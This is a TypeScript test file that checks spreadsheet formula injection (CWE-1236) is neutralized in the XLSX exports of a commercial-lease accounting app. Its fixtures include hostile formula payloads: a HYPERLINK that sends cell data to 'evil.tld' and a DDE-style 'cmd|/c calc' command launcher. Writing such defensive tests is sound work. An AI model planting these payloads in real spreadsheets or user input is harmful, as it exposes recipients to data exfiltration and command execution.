/**
 * Regression: spreadsheet formula injection (CWE-1236) in XLSX exports.
 *
 * ExcelJS writes string cell values verbatim — it does NOT escape a leading
 * `=`/`+`/`-`/`@`/tab/CR, so user-derived text imported from GL/ERP files
 * (vendor_name, account/pool descriptions, anomaly explanations) would execute
 * as a formula when the recipient opens the workbook. The CSV exporters already
 * neutralize the same fields via `neutralizeFormula`; these tests pin the same
 * protection on the three XLSX builders.
 *
 * Each test round-trips: build bytes → load back with ExcelJS → read the actual
 * cell value, proving the on-disk cell is neutralized (leading apostrophe) for
 * whole-cell user values, and proving values only interpolated mid-string keep
 * NO spurious apostrophe.
 */

import ExcelJS from "exceljs";
import Decimal from "decimal.js";
import { describe, expect, it } from "vitest";
import { generateSb1103Xlsx } from "../domain/sb1103/export";
import type {
  Sb1103ExportData,
  Sb1103GlEntry,
} from "../domain/sb1103/export";
import type { Sb1103RequestRow } from "../domain/sb1103/repository";
import { buildHistoricalXlsx } from "../domain/analysis/historical-xlsx";
import type {
  DetectedAnomaly,
  YearOverYearComparison,
} from "../domain/analysis/repository";

const FORMULA_TRIGGERS = ["=", "+", "-", "@", "\t", "\r"];

async function loadWorkbook(bytes: Uint8Array): Promise<ExcelJS.Workbook> {
  const wb = new ExcelJS.Workbook();
  await wb.xlsx.load(bytes as unknown as ArrayBuffer);
  return wb;
}

function cellText(ws: ExcelJS.Worksheet, row: number, col: number): string {
  return String(ws.getCell(row, col).value ?? "");
}

// ── SB 1103 packet ─────────────────────────────────────────────────────────────

function makeRequest(): Sb1103RequestRow {
  return {
    id: "aaaaaaaa-aaaa-4aaa-8aaa-aaaaaaaaaaaa",
    organization_id: "11111111-1111-4111-8111-111111111111",
    property_id: "bbbbbbbb-bbbb-4bbb-8bbb-bbbbbbbbbbbb",
    lease_id: "cccccccc-cccc-4ccc-8ccc-cccccccccccc",
    requested_by_name: "Alice Smith",
    requested_by_email: "alice@example.com",
    request_date: "2026-06-13",
    response_deadline: "2026-07-13",
    window_start_date: "2025-01-01",
    window_end_date: "2025-12-31",
    status: "pending",
    export_format: null,
    exported_at: null,
    notes: null,
    created_at: "2026-06-13T00:00:00.000Z",
    updated_at: "2026-06-13T00:00:00.000Z",
  };
}

function makeSb1103Data(
  glEntry: Partial<Sb1103GlEntry>,
  overrides: Partial<Sb1103ExportData> = {},
): Sb1103ExportData {
  const entry: Sb1103GlEntry = {
    id: "eeeeeeee-eeee-4eee-8eee-eeeeeeeeeeee",
    transaction_date: "2025-01-15",
    account_code: "CAM-100",
    account_description: "Landscaping",
    vendor_name: "Green Co",
    description: "January Landscaping",
    amount: new Decimal("500.00"),
    import_batch_id: "dddddddd-dddd-4ddd-8ddd-dddddddddddd",
    tenant_share_amount: new Decimal("125.00"),
    ...glEntry,
  };
  return {
    request: makeRequest(),
    property_name: "Main Building",
    property_address: "100 Main St, Los Angeles, CA 90001",
    is_ca_property: true,
    tenant_name: "Acme Corp",
    pro_rata_share: new Decimal("0.25"),
    gl_entries: [entry],
    category_subtotals: new Map([
      [entry.account_description, entry.tenant_share_amount],
    ]),
    total_cam_expenses: entry.amount,
    total_tenant_share: entry.tenant_share_amount,
    ...overrides,
  };
}

describe("SB1103 XLSX — formula injection neutralized", () => {
  it("neutralizes a malicious vendor_name in the Ledger sheet (whole cell)", async () => {
    const payload = '=HYPERLINK("https://evil.tld/?d="&A1,"OK")';
    const bytes = await generateSb1103Xlsx(
      makeSb1103Data({ vendor_name: payload }),
    );
    const wb = await loadWorkbook(bytes);
    const ledger = wb.getWorksheet("Ledger");
    expect(ledger).toBeDefined();

    // Ledger columns: Date | Account Code | Account Description | Vendor | ...
    // Row 1 = header, row 2 = first data row. Vendor = column 4.
    const vendorCell = cellText(ledger as ExcelJS.Worksheet, 2, 4);
    expect(vendorCell.startsWith("'")).toBe(true);
    expect(vendorCell).toBe("'" + payload);
    // The neutralized cell must NOT be parsed as a formula by ExcelJS.
    expect((ledger as ExcelJS.Worksheet).getCell(2, 4).formula).toBeUndefined();
  });

  it("neutralizes account_description in both Ledger and Subtotals sheets", async () => {
    const payload = "@SUM(1+1)*cmd";
    const bytes = await generateSb1103Xlsx(
      makeSb1103Data({ account_description: payload }),
    );
    const wb = await loadWorkbook(bytes);

    const ledger = wb.getWorksheet("Ledger") as ExcelJS.Worksheet;
    expect(cellText(ledger, 2, 3)).toBe("'" + payload); // Account Description = col 3

    const subtotals = wb.getWorksheet("Category Subtotals") as ExcelJS.Worksheet;
    // Row 1 = header, row 2 = first category (the malicious account_description).
    expect(cellText(subtotals, 2, 1)).toBe("'" + payload);
  });

  it("leaves benign text untouched (no spurious apostrophe)", async () => {
    const bytes = await generateSb1103Xlsx(
      makeSb1103Data({ vendor_name: "Green Co", account_description: "Landscaping" }),
    );
    const wb = await loadWorkbook(bytes);
    const ledger = wb.getWorksheet("Ledger") as ExcelJS.Worksheet;
    expect(cellText(ledger, 2, 4)).toBe("Green Co");
    expect(cellText(ledger, 2, 3)).toBe("Landscaping");
  });
});

// ── Historical analysis workbook ────────────────────────────────────────────────

function makeYoy(poolName: string): YearOverYearComparison {
  return {
    property_id: "bbbbbbbb-bbbb-4bbb-8bbb-bbbbbbbbbbbb",
    property_name: "Main Building",
    years: [2024, 2025],
    base_year: 2024,
    pool_comparisons: [
      {
        pool_name: poolName,
        amounts: { "2024": "1000.00", "2025": "1100.00" },
        base_year_amount: "1000.00",
        variance_amount: "100.00",
        variance_percent: "10.00",
        variance_level: "normal",
        matched_from: null,
      },
    ],
    total_amounts: { "2024": "1000.00", "2025": "1100.00" },
    total_variance_amount: "100.00",
    total_variance_percent: "10.00",
  };
}

function makeAnomaly(explanation: string): DetectedAnomaly {
  return {
    pool_name: "Janitorial",
    anomaly_type: "spike",
    severity: "warning",
    current_value: "1100.00",
    expected_value: "1000.00",
    variance_percent: "10.00",
    explanation,
    years_affected: [2025],
  };
}

describe("Historical XLSX — formula injection neutralized", () => {
  it("neutralizes a malicious pool_name in the Year-over-Year sheet (whole cell)", async () => {
    const payload = "=1+1";
    const bytes = await buildHistoricalXlsx({
      propertyId: "bbbbbbbb-bbbb-4bbb-8bbb-bbbbbbbbbbbb",
      yoy: makeYoy(payload),
      anomalies: [],
    });
    const wb = await loadWorkbook(bytes);
    const yoy = wb.getWorksheet("Year-over-Year Comparison") as ExcelJS.Worksheet;
    // Row 1 = property title, row 2 = header, row 3 = first pool. Pool = column 1.
    expect(cellText(yoy, 3, 1)).toBe("'" + payload);
    expect(yoy.getCell(3, 1).formula).toBeUndefined();
  });

  it("neutralizes a malicious anomaly explanation (whole cell)", async () => {
    const payload = "-2+3+cmd|'/c calc'!A1";
    const bytes = await buildHistoricalXlsx({
      propertyId: "bbbbbbbb-bbbb-4bbb-8bbb-bbbbbbbbbbbb",
      yoy: makeYoy("Janitorial"),
      anomalies: [makeAnomaly(payload)],
    });
    const wb = await loadWorkbook(bytes);
    const anomalies = wb.getWorksheet("Detected Anomalies") as ExcelJS.Worksheet;
    // Row 1 = header, row 2 = first anomaly. Explanation = column 7.
    expect(cellText(anomalies, 2, 7)).toBe("'" + payload);
  });

  it("does NOT add a spurious apostrophe to the mid-string property title", async () => {
    // property_name is interpolated as `Property: ${name}` — the cell starts
    // with the literal "Property:", so it is never a formula and must stay raw
    // even when the property name itself leads with a trigger character.
    const evilYoy = makeYoy("Janitorial");
    evilYoy.property_name = "=DangerCorp";
    const bytes = await buildHistoricalXlsx({
      propertyId: "bbbbbbbb-bbbb-4bbb-8bbb-bbbbbbbbbbbb",
      yoy: evilYoy,
      anomalies: [],
    });
    const wb = await loadWorkbook(bytes);
    const yoy = wb.getWorksheet("Year-over-Year Comparison") as ExcelJS.Worksheet;
    expect(cellText(yoy, 1, 1)).toBe("Property: =DangerCorp");
    expect(cellText(yoy, 1, 1).startsWith("'")).toBe(false);
  });

  it("leaves benign pool/explanation text untouched", async () => {
    const bytes = await buildHistoricalXlsx({
      propertyId: "bbbbbbbb-bbbb-4bbb-8bbb-bbbbbbbbbbbb",
      yoy: makeYoy("Landscaping"),
      anomalies: [makeAnomaly("Costs rose sharply year over year.")],
    });
    const wb = await loadWorkbook(bytes);
    const yoy = wb.getWorksheet("Year-over-Year Comparison") as ExcelJS.Worksheet;
    expect(cellText(yoy, 3, 1)).toBe("Landscaping");
    const anomalies = wb.getWorksheet("Detected Anomalies") as ExcelJS.Worksheet;
    expect(cellText(anomalies, 2, 7)).toBe("Costs rose sharply year over year.");
  });
});

// ── Helper-level guard: every trigger char is covered ───────────────────────────

describe("formula trigger coverage", () => {
  it("the trigger set matches the documented CWE-1236 leads", () => {
    expect(FORMULA_TRIGGERS).toEqual(["=", "+", "-", "@", "\t", "\r"]);
  });
});
